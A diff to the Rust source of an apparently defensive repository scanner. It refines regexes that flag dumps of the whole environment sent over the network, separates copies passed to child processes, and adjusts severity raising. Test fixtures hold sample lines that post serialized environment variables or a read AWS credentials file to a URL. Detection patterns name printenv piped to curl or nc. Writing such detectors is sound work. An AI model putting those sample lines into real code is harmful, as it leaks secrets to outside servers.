@@ -40,15 +40,35 @@ fn credential_paths() -> &'static Regex {
     )
 }
 
-/// A copy of the whole environment: a JSON dump, a spread, `Object.assign({}, ...)`, the entries
-/// or keys, Python's `dict(os.environ)` or `.copy()`, and `printenv` or `env` piped to a sender or
-/// substituted into its arguments. One variable (`process.env.HOME`, `printenv HOME`) is not.
+/// The whole environment turned into text: a serializer (`JSON.stringify`, `util.inspect`,
+/// `json.dumps`, `str`, `repr`) around the environment or a copy of it, and `printenv` or `env`
+/// piped to a sender or substituted into its arguments. One variable (`process.env.HOME`,
+/// `printenv HOME`) is not a dump, and neither is a copy for a child process (see `env_copies`).
 fn env_dumps() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"JSON[.]stringify\(\s*process[.]env|\{\s*[.][.][.]\s*process[.]env|Object[.]assign\(\s*\{\s*\}\s*,\s*process[.]env\s*\)|Object[.](?:entries|keys|values)\(\s*process[.]env\s*\)|dict\(os[.]environ\)|os[.]environ[.](?:copy|items|keys|values)\(\s*\)|(?:^|[\s;&(`])(?:printenv|env)\s*\|(?:[^\n|]*\|)*\s*(?:curl|wget|nc|ncat)\b|\b(?:curl|wget)\b[^\n]*(?:\$\(|`)\s*(?:printenv|env)\s*(?:\)|`)",
+        r"(?:JSON[.]stringify|util[.]inspect|json[.]dumps|\bstr|\brepr)\(\s*(?:\{\s*[.][.][.]\s*process[.]env|Object[.]assign\(\s*\{\s*\}\s*,\s*process[.]env|Object[.](?:entries|keys|values)\(\s*process[.]env|dict\(\s*os[.]environ|process[.]env|os[.]environ)|(?:^|[\s;&(`])(?:printenv|env)\s*\|(?:[^\n|]*\|)*\s*(?:curl|wget|nc|ncat)\b|\b(?:curl|wget)\b[^\n]*(?:\$\(|`)\s*(?:printenv|env)\s*(?:\)|`)",
     )
+}
+
+/// A copy of the whole environment that is not yet text: a spread, `Object.assign({}, ...)`, the
+/// entries or keys, Python's `dict(os.environ)` or `.copy()`. A build script makes one to give a
+/// child process; it is a dump only when it goes straight into a send or is sent from a variable
+/// that no child process uses (see `copy_reaches_a_send`).
+fn env_copies() -> &'static Regex {
+    static CELL: OnceLock<Regex> = OnceLock::new();
+    cached(
+        &CELL,
+        r"\{\s*[.][.][.]\s*process[.]env|Object[.]assign\(\s*\{\s*\}\s*,\s*process[.]env\s*\)|Object[.](?:entries|keys|values)\(\s*process[.]env\s*\)|dict\(os[.]environ\)|os[.]environ[.](?:copy|items|keys|values)\(\s*\)",
+    )
+}
+
+/// What stands before a copy that is the `env` option or an environment variable of a child
+/// process: `env: {`, `const env = {`, `env=`.
+fn env_target_before() -> &'static Regex {
+    static CELL: OnceLock<Regex> = OnceLock::new();
+    cached(&CELL, r"(?i)\benv\w*\s*[:=]\s*[\w.(\[{\s]*$")
 }
 
 /// A read of the whole environment or of a well-known token: what a webhook post may carry.
@@ -192,6 +212,10 @@ fn send_near(text: &str, at: usize) -> bool {
 /// chat service) and is MEDIUM only because nothing is known to run the file.
 const RAISE_NOTE: &str = " It is MEDIUM because nothing is known to run this file; it is HIGH when an install script, a build step or an editor task runs it.";
 
+/// What `RAISE_NOTE` becomes when the raise lifts the finding.
+const RAISED_NOTE: &str =
+    " An install script, a build step or an editor task runs this file, so it is HIGH.";
+
 fn why_with_note(why: &str, note: bool) -> String {
     if note {
         format!("{why}{RAISE_NOTE}")
@@ -265,7 +289,7 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
 }
 
 /// Raises the MEDIUM `exfil.*` findings of a file that an auto-run surface reaches to HIGH, when
-/// the finding carries `RAISE_NOTE`: it has the shape of a theft (a read and a send, an
+/// the finding ends its `why` with `RAISE_NOTE` (and replaces the note): it has the shape of a theft (a read and a send, an
 /// environment dump and a send, a post to a chat service) and is MEDIUM only for a test path or the
 /// chat-webhook ruling. Those exist for files that only sit in the tree: a script that runs on
 /// install and posts to a chat service, or reads `.npmrc` from a file under `test/`, is not a bot or
@@ -273,10 +297,18 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
 /// orchestrator calls this once with the set of reached paths and the findings it collected;
 /// other groups are not touched.
 pub(crate) fn raise_reached(findings: &mut [Finding], reached: &ReachedTest<'_>) {
-    for finding in findings.iter_mut().filter(|x| {
-        x.group == Group::Exfil && x.severity == Severity::Medium && x.why.contains(RAISE_NOTE)
-    }) {
+    for finding in findings
+        .iter_mut()
+        .filter(|x| x.group == Group::Exfil && x.severity == Severity::Medium)
+    {
+        // `Finding` has no spare field, so the mark is the note a rule puts at the end of `why`:
+        // it is the rule's own text (repo text reaches `seen`, never `why`), and the raise takes
+        // it off and puts the note for a run file in its place.
+        let Some(base) = finding.why.strip_suffix(RAISE_NOTE) else {
+            continue;
+        };
         if reached(&finding.path) {
+            finding.why = format!("{base}{RAISED_NOTE}");
             finding.severity = Severity::High;
         }
     }
@@ -312,13 +344,42 @@ fn cred_path(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Find
     emit(f, text, &hits, &rule, out);
 }
 
+/// Whether the copy of the environment at `at` is sent: not in a comment, not the `env` option or
+/// an environment variable of a child process, not in a file that spawns a process within 10 lines,
+/// and either an argument of a send call on its line or a send within 10 lines.
+fn copy_reaches_a_send(text: &str, at: usize, lang: Lang) -> bool {
+    if in_comment(text, at, lang) {
+        return false;
+    }
+    let line_start = text[..at].rfind('\n').map_or(0, |i| i + 1);
+    let before = &text[line_start..at];
+    if env_target_before().is_match(before) {
+        return false;
+    }
+    if send_calls().is_match(before) {
+        return true;
+    }
+    let near = lines_around(text, at, NEAR, NEAR);
+    !spawn_apis().is_match(near) && send_calls().is_match(near)
+}
+
 fn env_dump(f: &FileCtx, lang: Lang, text: &str, test: bool, out: &mut Vec<Finding>) {
-    // HIGH when the dump flows to a send or a file write within 10 lines. A dump in a file that
-    // talks to the network elsewhere, or in a test, is MEDIUM; a dump with no network is clean.
-    let (hits, flow) = graded_hits(env_dumps(), text, |at| {
+    // HIGH when the dump flows to a send or a file write within 10 lines, or a copy of the
+    // environment is sent. A dump in a file that talks to the network elsewhere, or in a test, is
+    // MEDIUM; a dump with no network is clean. A copy that is not sent is no finding at all.
+    let (mut hits, mut flow) = graded_hits(env_dumps(), text, |at| {
         let near = lines_around(text, at, NEAR, NEAR);
         !in_comment(text, at, lang) && (send_calls().is_match(near) || write_calls().is_match(near))
     });
+    for m in env_copies().find_iter(text) {
+        if copy_reaches_a_send(text, m.start(), lang) {
+            if !flow {
+                hits.first = Some(m.start());
+            }
+            hits.count += 1;
+            flow = true;
+        }
+    }
     let severity = if flow && !test {
         Severity::High
     } else if flow || network_words().is_match(text) || send_calls().is_match(text) {
@@ -727,6 +788,57 @@ mod tests {
     }
 
     #[test]
+    fn a_copy_of_the_environment_for_a_child_process_is_not_a_dump() {
+        // Corpus shapes (vscode, react, esbuild): the environment is copied into the `env`
+        // option of a child process, with a send or a file write a few lines away.
+        let cases = [
+            "const out = await exec('git', ['lfs', 'pull'], { env: { ...process.env, GIT_LFS_SKIP_SMUDGE: '1' } });\nfs.writeFileSync('log.txt', out);\nfetch(u);\n",
+            "const env = { ...process.env, PATH: path.join(root, 'bin') };\nspawn('node', [script], { env, stdio: 'inherit' });\nfetch(u);\n",
+            "const childEnv = Object.assign({}, process.env, { CI: '1' });\nfetch(u);\nrun(cmd, childEnv);\n",
+            "const e = { ...process.env };\nexecFileSync('git', args, { env: e });\nfetch(u);\n",
+            "fork(file, { env: Object.assign({}, process.env, { A: '1' }) });\nfetch(u);\n",
+        ];
+        for js in cases {
+            let v = code(Lang::Js, js);
+            assert!(v.iter().all(|f| f.rule != "exfil.env-dump"), "{js}");
+        }
+        let py = [
+            "env = os.environ.copy()\nenv['A'] = '1'\nsubprocess.run(cmd, env=env)\nrequests.get(u)\n",
+            "subprocess.run(cmd, env=dict(os.environ))\nrequests.get(u)\n",
+            "e = os.environ.copy()\nsubprocess.Popen(cmd, env=e)\nrequests.get(u)\n",
+        ];
+        for text in py {
+            let v = code(Lang::Py, text);
+            assert!(v.iter().all(|f| f.rule != "exfil.env-dump"), "{text}");
+        }
+    }
+
+    #[test]
+    fn a_serialized_or_sent_copy_of_the_environment_is_high() {
+        for js in [
+            "fetch(u, { method: 'POST', body: JSON.stringify({ ...process.env }) });\n",
+            "const body = JSON.stringify(Object.assign({}, process.env));\nfetch(u, { method: 'POST', body });\n",
+            "const body = JSON.stringify(Object.entries(process.env));\nfetch(u, { body });\n",
+            "const text = util.inspect(process.env);\nfetch(u, { body: text });\n",
+            "const body = { ...process.env };\nfetch(u, { method: 'POST', body: JSON.stringify(body) });\n",
+            "fetch(u + '?' + new URLSearchParams({ ...process.env }));\n",
+            "const e = { ...process.env };\nexecFileSync('git', args, { env: e });\n// ...\nfetch(u, { body: JSON.stringify(process.env) });\n",
+        ] {
+            let v = code(Lang::Js, js);
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{js}");
+        }
+        for py in [
+            "requests.post(u, data=json.dumps(dict(os.environ)))\n",
+            "requests.post(u, data=json.dumps(os.environ.copy()))\n",
+            "body = os.environ.copy()\nrequests.post(u, json=dict(body))\n",
+            "body = str(os.environ)\nrequests.post(u, data=body)\n",
+        ] {
+            let v = code(Lang::Py, py);
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{py}");
+        }
+    }
+
+    #[test]
     fn reading_a_variable_or_piping_a_command_that_is_not_a_dump_is_clean() {
         for js in [
             "fetch(u, { body: process.env.HOME });",
@@ -936,10 +1048,66 @@ mod tests {
         assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
         raise_reached(&mut v, &|path| path == "src/a.file");
         assert_eq!(one(&v, "exfil.webhook").severity, Severity::High);
-        // A file no auto-run surface reaches stays MEDIUM.
+        // A file no auto-run surface reaches stays MEDIUM, with its note.
         let mut v = code(Lang::Js, &t);
         raise_reached(&mut v, &|path| path == "other.js");
         assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
+        assert!(
+            one(&v, "exfil.webhook")
+                .why
+                .contains("It is MEDIUM because")
+        );
+    }
+
+    #[test]
+    fn a_raise_replaces_the_medium_note_and_a_second_raise_changes_nothing() {
+        let t = format!("fetch('{DISCORD}');\n");
+        let mut v = code(Lang::Js, &t);
+        let before = one(&v, "exfil.webhook").why.clone();
+        assert!(before.ends_with(RAISE_NOTE), "{before}");
+        raise_reached(&mut v, &|_| true);
+        let f = one(&v, "exfil.webhook");
+        assert_eq!(f.severity, Severity::High);
+        assert!(!f.why.contains("It is MEDIUM"), "{}", f.why);
+        assert!(f.why.contains("so it is HIGH"), "{}", f.why);
+        assert!(
+            f.why.starts_with(before.trim_end_matches(RAISE_NOTE)),
+            "{}",
+            f.why
+        );
+        let after = f.why.clone();
+        raise_reached(&mut v, &|_| true);
+        assert_eq!(one(&v, "exfil.webhook").why, after);
+        // The same words in a finding that does not end with the note are not a mark.
+        let mut forged = vec![Finding {
+            severity: Severity::Medium,
+            group: Group::Exfil,
+            rule: "exfil.cred-path".to_string(),
+            path: "src/a.file".to_string(),
+            line: 1,
+            why: format!("{RAISE_NOTE} Something else."),
+            seen: RAISE_NOTE.to_string(),
+            action: String::new(),
+            count: 1,
+        }];
+        raise_reached(&mut forged, &|_| true);
+        assert_eq!(forged[0].severity, Severity::Medium);
+    }
+
+    #[test]
+    fn a_star_unpacking_line_does_not_hide_a_credential_read() {
+        // N4 variant: in Python a line that starts with a star is code.
+        let t = format!("*_, k = 0, open('{AWS_CREDS}').read()\nrequests.post(u, data=k)\n");
+        assert_eq!(
+            one(&code(Lang::Py, &t), "exfil.cred-path").severity,
+            Severity::High
+        );
+        // In a language with block comments the same line is a comment.
+        let c = format!(" * reads {NPMRC}\nfetch(u);\n");
+        assert_eq!(
+            one(&code(Lang::Js, &c), "exfil.cred-path").severity,
+            Severity::Medium
+        );
     }
 
     #[test]
